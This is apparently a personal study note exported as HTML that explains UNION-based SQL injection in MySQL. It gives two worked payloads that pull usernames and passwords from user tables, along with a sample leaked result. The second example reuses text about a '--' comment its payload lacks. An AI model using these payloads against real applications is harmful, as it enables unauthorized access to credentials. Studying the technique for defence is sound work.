<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Examples of queries (mysql)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Examples of queries (mysql)</h1><br/><span style="color:#a5452a;">example in a database</span><br /><div class="codebox"><div class="codebox">mysql&gt;&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;Users&nbsp;WHERE&nbsp;lname=&#39;Dent&#39;&nbsp;UNION&nbsp;SELECT&nbsp;*&nbsp;FROM&nbsp;Customers;<br /></div></div><br />    <a href=""><img src="images/1550-1.png" alt="images/1550-1.png" /></a><br /><br /><span style="color:#a5452a;">example</span><br />original query is:<br /><code>SELECT author,title,year FROM books WHERE publisher = ‘</code><code><span style="color:#f6ff00;">Wiley</span></code><code>’</code><br /><table class="table"><tr><th>author</th><th>title</th><th>year</th></tr><tr><td>Litchfield</td><td>The Database Hacker’s Handbook</td><td>2005</td></tr><tr><td>Anley</td><td>The Shellcoder’s Handbook</td><td>2007</td></tr></table><br />Now to exploit the database instead of <span style="color:#f6ff00;">Wiley</span> we insert the payload <span style="color:#f6ff00;">Wiley’ UNION SELECT username,password,uid FROM users--</span><br />so that the first string terminator(<strong><span style="color:#f6ff00;">&#39;</span></strong>) will end the publisher parameter requested, and the SQL comment <strong><span style="color:#f6ff00;">--</span></strong> will comment the string terminator(<strong>&#39;</strong>) of the original query<br />so now we perform this query:<br /><code>SELECT author,title,year FROM books WHERE publisher = ‘</code><code><span style="color:#f6ff00;">Wiley’ UNION SELECT username,password,uid FROM users--</span></code><code>’</code><br />that is equal to:<br /><code>SELECT author,title,year FROM books WHERE publisher = </code><strong><code>‘</code></strong><code><span style="color:#f6ff00;">Wiley’ UNION SELECT username,password,uid FROM users</span></code><br /><table class="table"><tr><th>author</th><th>title</th><th>year</th></tr><tr><td>Litchfield</td><td>The Database Hacker’s Handbook</td><td>2005</td></tr><tr><td>Anley</td><td>The Shellcoder’s Handbook</td><td>2007</td></tr><tr><td>admin</td><td>r00tr0x</td><td>0</td></tr><tr><td>cliff</td><td>Reboot</td><td>1</td></tr></table><br /><br /><br /><span style="color:#a5452a;">example</span><br />original query is:<br /><code>SELECT Name, Description FROM Products WHERE ID=&#39;</code><code><span style="color:#f6ff00;">id_value</span></code><code>&#39;</code><br />Now to exploit the database instead of <span style="color:#f6ff00;">id_value</span> we insert the payload  <span style="color:#f6ff00;">&#39; UNION SELECT Username, Password FROM Accounts WHERE &#39;a&#39;=&#39;a</span><br />so that the first string terminator(<strong><span style="color:#f6ff00;">&#39;</span></strong>) will end the ID parameter requested, and the SQL comment <strong><span style="color:#f6ff00;">--</span></strong> will comment the string terminator(<strong>&#39;</strong>) of the original query<br />so now we perform this query:<br /><code>SELECT Name, Description FROM Products WHERE ID=&#39;</code><code><span style="color:#f6ff00;">&#39; UNION SELECT Username, Password FROM Accounts WHERE &#39;a&#39;=&#39;a</span></code><code>&#39;</code><br />This query asks the database to select the items with an empty id(ID=&#39;&#39;), so the first SELECT will return an empty set, but the interesting part come now!<br />UNION combine the first empty set with the second one, that have all the entries Username and Password from the Accounts table.<br />This because the condition “a”=&quot;a&quot; is always true and select all the items in the Accounts table!<br /></div>
</body>
</html>
